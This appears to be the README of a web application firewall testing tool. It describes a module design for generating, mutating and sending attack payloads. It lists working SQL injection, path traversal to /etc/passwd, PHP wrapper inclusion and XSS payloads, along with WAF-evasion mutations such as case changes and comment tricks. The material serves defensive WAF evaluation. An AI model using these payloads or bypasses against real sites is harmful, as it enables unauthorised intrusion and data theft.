WAF Testing Tool
================

When one finds a vulnerability in source code of a web application using white box approach one of the challenges that may arise is to bypass a web application firewall. Speaking about bypass methods, it is important for a web application firewall not only to have an extensive list of signatures that can block the vast majority of attacks but also to be immune to various evasion techniques by properly normalizing input data. For the sake of comprehensive web application firewall testing it is not enough just to use web application vulnerability scanner. 

The proposed methodology makes use of attack payloads that are mutated in various ways. It allows to test web application firewalls more thoroughly.

The picture below demonstrates architecture of an application that had been developed to test and evaluate effectiveness of web application firewalls.

![architecture](http://i.imgur.com/myTosWE.png)

The main components of the application are:

- module that generates base payloads
- module that mutates payloads
- HTTP request sending module
- detection module

Base payload generation module loads patterns and generates a set of attack vectors.

Base payload is a vector that exploits a vulnerability in source code of a web application and which can be tracked in detector module depending on the result of exploitation. For example, for an SQL Injection successful exploitation can be confirmed by an SQL query structure modification.

Base payload pattern looks like as follows:

```
1 union {|all }select {version()|1|'AA'}, {database()|(select 1)|2} from {|dual|information_schema.tables}
```

All possible combinations of the base payload are generated, after that this set is passed to mutation module.

Examples of base payloads:

```
1 union select version(), 2 from dual 
1 union all select 'AA', (select 1) from information_schema.tables 
1 union select 1, 2
```

Mutation is a modification of the base payload which is aimed at bypassing data normalization routines implemented in web application firewall. Mutation should modify the base payload to be completely different however it should remain effective at the same time. Mutation module receives a set of generated base payloads and loads from the database mutation techniques specific for the particular vulnerability type. Each mutation has its subtype so that mutation module was able to operate with mutually exclusive mutation techniques. The list of mutation techniques was compiled using widely known WAF bypass techniques as well as methods based on our own experience.

After all mutations are generated the output set is passed to request sender.

Examples of mutations for SQL Injection:

- character case modification
- replacement of whitespace characters with its analogues
- replacement of operators with its analogues
- SQL query modification with the use of complex structures specific for particular RDBMS

As a result, for each base payload the following combinations could be generated:

```
1 union select version(), 2 from dual 
1%0BUnIoN%0BsElEcT%0BvErSiOn(),%0B2%0BfRoM%0BdUaL 
1 /*!12345UNION ALL SELECT VERSION(), 2 FROM*/ DUAL 
1--%0Aunion--%0Aselect--%0A@@`version`,--%0A3-1--%0Afrom--%0Adual
```

Overall number of mutations is over 50.
Overall number of mutation combinations of base payloads depending on the type of vulnerability varies from 1000 to 40000.

Request sender forms HTTP requests and transports them to the target web application through WAF. It also sends responses from the application to the detection module. HTTP requests are formed in such a way so that they could cover all attack vector channels such as urlencoded POST data, multipart, parameter names, etc. Attack vectors are injected into:

- GET, POST, Cookie parameters
- GET, POST, Cookie array indeces
- HTTP headers
- Contents, Content-Type and filename of uploaded file

Overall number of attack requests is about 500000.

Detection module processes responses that were received from request sender module. Finally, it makes decision and adds it to the final report.

Base payloads that are used:

```
1 union select {version()|1111111111|'AAAAAAAA'}, {222222222|database()|(select user())|'BBBBBBBBBBBBB'} {|from information_schema.tables} 

1 and {1=1|99=99|98{!=|<>}97} 

(-1)union(select({1|load_file('/etc/passwd')}),{(2)|(id)from(news)|(user)from(mysql.user){|having(user)like('root')}}) 

1 union select * from (select 11)a join (select {22|user from mysql.user})b {|into {outfile|dumpfile} '/blah/blah/testfilename'} 

(select*from(select name_const('123',1),name_const('123',1))a) 

ExtractValue(1,concat(0x5c,'123')) 

(select count(*) from {mysql.user|information_schema.tables|news|(select 1 union select 2 union select 3)x} group by concat('123',floor(rand(0)*2))) 

(@:=1)||@ group by concat('123',@:=@-1)having @||min(@:=0) 

1 into {outfile|dumpfile} '/blah/blah/blahfilenameblah' lines terminated by 'payload' 

data:,<?php echo 123; ?> 

php://input 
 
php://filter{|/blah/blah/blah}/{zlib.deflate|read=zlib.deflate|convert.base64-encode|read=convert.base64-encode|read}{|/blah/blah/blah}/resource=longfilenameindexblah{|.php|.txt|.png} 

{http{|s}://|ftp://username:password@}site.com/{|folder1/|folder2/folder3/}filenameblah{.php|.txt|.gif} 

{|file://}{/../../../../../..}{/aaaaaaaaaaaaaaaaaaaa/../../../../../..|..........................................................................|././././././././././././././././././././././././././././.}{/etc/{passwd|hosts}|/proc/version} 

{|file://}{/../../../../../..}{/aaaaaaaaaaaaaaaaaaaa/../../../../../..|..........................................................................|././././././././././././././././././././././././././././.}/boo{t.ini|<<|>>>>} 

<script blah>123</script blah> 

<script blah src="{http{:|://}site.com/blah|data:,123}" blah>blah</script blah> 

<{a|abbr|acronym|address|applet|area|b|base|basefont|bdo|big|blockquote|body|br|button|caption|center|cite|code|col|colgroup|dd|del|dfn|dir|div|dl|dt|em|fieldset|font|form|frame|frameset|head|h1|h2|h3|h4|h5|h6|hr|html|i|iframe|img|input|ins|kbd|label|legend|li|link|map|menu|meta|noframes|noscript|object|ol|optgroup|option|p|param|pre|q|s|samp|script|select|small|span|strike|strong|style|sub|sup|table|tbody|td|textarea|tfoot|th|thead|title|tr|tt|u|ul|var} blah {onload|onunload|onblur|onchange|onfocus|onreset|onselect|onsubmit|onabort|onkeydown|onkeypress|onkeyup|onclick|ondblclick|onmousedown|onmousemove|onmouseout|onmouseover|onmouseup}=123 blah> 

<a href="{javascript:123|data:,123}">test</a> 

+ADw-script+AD4-123+ADw-/script+AD4-
```
